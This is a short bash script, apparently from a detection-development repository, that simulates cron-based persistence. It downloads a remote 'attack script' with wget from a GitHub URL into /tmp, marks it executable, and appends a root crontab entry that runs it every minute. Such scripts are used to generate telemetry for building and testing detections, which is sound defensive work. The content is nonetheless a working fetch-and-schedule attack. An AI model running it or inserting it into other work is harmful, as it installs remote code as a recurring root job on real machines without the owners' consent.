#!/bin/bash

mkdir /tmp/persistencetest/

#Grab the attack script
wget "https://raw.githubusercontent.com/mikecybersec/DetectionDevelopment/main/hello.sh" -O /tmp/persistencetest/attack2.sh

#Wait for 5 seconds
sleep 5

chmod +x /tmp/persistencetest/attack2.sh
touch /var/spool/cron/crontabs/root
/usr/bin/crontab /var/spool/cron/crontabs/root

sleep 5

#Create cron job to execute attack script every 1 minute
echo "*/1 * * * * /tmp/persistencetest/attack2.sh*" >> /var/spool/cron/crontabs/root

# crontab -u username -l to list the crontab for the user
